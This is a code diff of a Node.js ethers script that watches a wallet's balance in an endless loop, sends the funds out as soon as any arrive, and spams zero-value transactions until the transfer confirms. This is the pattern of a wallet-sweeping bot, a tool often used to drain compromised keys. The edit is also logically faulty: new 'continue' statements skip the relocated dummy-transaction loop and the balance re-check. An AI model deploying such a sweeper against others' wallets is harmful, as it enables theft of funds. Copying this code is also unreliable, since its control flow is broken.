@@ -12,8 +12,8 @@ const provider = new ethers.JsonRpcProvider(process.env.RPC);
 let wallet = new ethers.Wallet(privKey, provider);
 
 async function sendTransaction() {
+  while (true) { // outer loop
   let balance = await provider.getBalance(fromAddress);
-
   while (true) {
     try {
       if (balance.toString() === "0") {
@@ -39,6 +39,7 @@ async function sendTransaction() {
       const amountx = balance - transactionx;
 
       let transactionCount = await provider.getTransactionCount(fromAddress);
+      let tx;
 
       if (amountToSend > 0) {
         console.log("enough to send with normal Gas");
@@ -51,35 +52,9 @@ async function sendTransaction() {
         };
 
         // Send the transaction
-        let tx = await wallet.sendTransaction(transaction);
+        tx = await wallet.sendTransaction(transaction);
         console.log(`Transaction hash: ${tx.hash}`);
-
-              // Start sending dummy transactions
-      while (true) {
-        try {
-          transactionCount += 1;
-          let dummyTx = {
-            nonce: transactionCount,
-            to: dummyToAddress,
-            value: "0", // Sending 0 ether
-          };
-          let dummyTransaction = await wallet.sendTransaction(dummyTx);
-          console.log(`Dummy transaction hash: ${dummyTransaction.hash}`);
-
-          // Check if the main transaction is confirmed
-          let receipt = await provider.getTransactionReceipt(tx.hash);
-          if (receipt.status > 0) {
-            console.log(
-              `Main transaction was confirmed in block ${receipt.blockNumber}`
-            );
-            break;
-          }
-        } catch (error) {
-          console.error("An error occurred while sending dummy transactions:", error);
-        }
-        await new Promise((resolve) => setTimeout(resolve, 1000));
-      }
-
+        continue; // continue to the outer loop
       } else {
         if (amountx > 0) {
           console.log("enough to send with low Gas");
@@ -93,47 +68,53 @@ async function sendTransaction() {
           };
 
           // Send the transaction
-          let tx = await wallet.sendTransaction(transaction);
+          tx = await wallet.sendTransaction(transaction);
           console.log(`Transaction hash: ${tx.hash}`);
-
-          while (true) {
-            try {
-              transactionCount += 1;
-              let dummyTx = {
-                nonce: transactionCount,
-                to: dummyToAddress,
-                value: "0", // Sending 0 ether
-              };
-              let dummyTransaction = await wallet.sendTransaction(dummyTx);
-              console.log(`Dummy transaction hash: ${dummyTransaction.hash}`);
-    
-              // Check if the main transaction is confirmed
-              let receipt = await provider.getTransactionReceipt(tx.hash);
-              if (receipt.status > 0) {
-                console.log(
-                  `Main transaction was confirmed in block ${receipt.blockNumber}`
-                );
-                break;
-              }
-            } catch (error) {
-              console.error("An error occurred while sending dummy transactions:", error);
-            }
-            await new Promise((resolve) => setTimeout(resolve, 1000));
-          }
+          continue; // continue to the outer loop
     
         } else {
           console.log("not enough to send with low or high Gas");
+            await new Promise((resolve) => setTimeout(resolve, 1000));
         }
-
       }
 
-      await new Promise((resolve) => setTimeout(resolve, 1000));
-      balance = await provider.getBalance(fromAddress);
+              // Check balance again after transaction
+              balance = await provider.getBalance(fromAddress);
+
+
+        // Start sending dummy transactions
+        while (true) {
+          try {
+            transactionCount += 1;
+            let dummyTx = {
+              nonce: transactionCount,
+              to: dummyToAddress,
+              value: "0", // Sending 0 ether
+            };
+            let dummyTransaction = await wallet.sendTransaction(dummyTx);
+            console.log(`Dummy transaction hash: ${dummyTransaction.hash}`);
+
+            // Check if the main transaction is confirmed
+            let receipt = await provider.getTransactionReceipt(tx.hash);
+            if (receipt.status > 0) {
+              console.log(
+                `Main transaction was confirmed in block ${receipt.blockNumber}`
+              );
+              break; // break the dummy transaction loop
+            }
+          } catch (error) {
+            console.error("An error occurred while sending dummy transactions:", error);
+          }
+          await new Promise((resolve) => setTimeout(resolve, 1000));
+        }
+
+        break; // break the inner loop to start the process over
     } catch (error) {
       console.error("An error occurred:", error);
       await new Promise((resolve) => setTimeout(resolve, 1000));
     }
   }
+}
 }
 
 sendTransaction();
